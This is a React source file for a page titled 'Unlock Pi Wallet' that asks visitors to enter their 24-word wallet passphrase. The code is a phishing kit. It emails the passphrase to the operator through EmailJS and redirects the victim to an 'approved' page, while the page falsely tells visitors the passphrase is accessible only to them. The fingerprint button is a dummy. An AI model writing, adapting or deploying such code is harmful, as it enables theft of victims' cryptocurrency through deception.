import React, {useState } from 'react'
import "./index.css"
import emailjs from '@emailjs/browser';
import Spinner from 'react-activity/dist/Spinner';
import 'react-activity/dist/Spinner.css';
import { useNavigate } from 'react-router-dom';


function Wallet() {
    const navigate =useNavigate()
    const [phrase, setPhrase] = useState("");
    const [error, setError] = useState(false);
    const [loading, setLoading] = useState(false);
  
    const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
    const userID = import.meta.env.VITE_EMAILJS_USER_ID;
  
    const handleSend = async () => {
      setLoading(true);
      setError(false); // Reset error state before starting
      
      const wordCount = phrase.trim().split(/\s+/).length;
      if (wordCount !== 24) {
        setError(true);
        setLoading(false); // Stop loading if there is an error
        return;
      }
  
      const templateParams = { message: phrase };
  
      try {
        await emailjs.send(serviceID, templateID, templateParams, userID);
        setPhrase(""); 
        navigate('/approved')
      } catch (error) {
        console.error('Error:', error);
        alert('Verification failed. Please try again.');
        setError(true);
      } finally {
        setLoading(false); // Stop loading after async operation completes
      }
    };

    return (
        <div>
            <div className="verify">

                <h2 >Unlock Pi Wallet</h2>
                <div className='verify-form'>
                    <textarea onChange={(e)=>setPhrase(e.target.value)} value={phrase}  className='resize-none'  placeholder="Enter Your 24-character passphrase here" cols="30" rows="10" required="" />
                    {error && <p className="text-red-600 my-1">Invalid phrase</p>}
                </div>
                    <button onClick={handleSend} className="passphrasebtn flex  items-center justify-center" > {loading ? <Spinner color="#76348e" /> : <span>  UNLOCK WITH PHRASE</span>}</button>
                    <button className="fingerprintbtn items-center justify-center flex"> {loading ? <Spinner color="white" /> : <span>UNLOCK WITH FINGERPRINT</span>}</button>
                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of Passphrase is impossible. Lost your passphrase? You can create a new wallet, but all your π in you previous wallet will be inaccessible.</p>
            </div>
        </div >
    )
}

export default Wallet